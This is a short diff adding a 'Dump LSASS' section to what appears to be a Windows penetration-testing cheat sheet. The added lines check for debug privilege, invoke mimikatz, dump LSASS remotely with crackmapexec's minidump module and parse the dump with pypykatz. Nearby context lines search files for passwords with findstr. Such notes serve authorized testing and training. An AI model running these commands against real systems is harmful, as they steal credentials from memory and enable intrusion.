@@ -50,6 +50,18 @@ findstr /si password *.txt
 findstr /spin "password" *.*
 ```
 
+Dump LSASS:
+check for #SEDebugPrivilige
+```powershell
+whoami /priv
+#run mimikatz
+```
+
+```bash
+crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD -M minidump
+pypykatz lsa minidump lsass.DMP
+```
+
 Add domain NB name to /etc/hosts
 
 ```bash
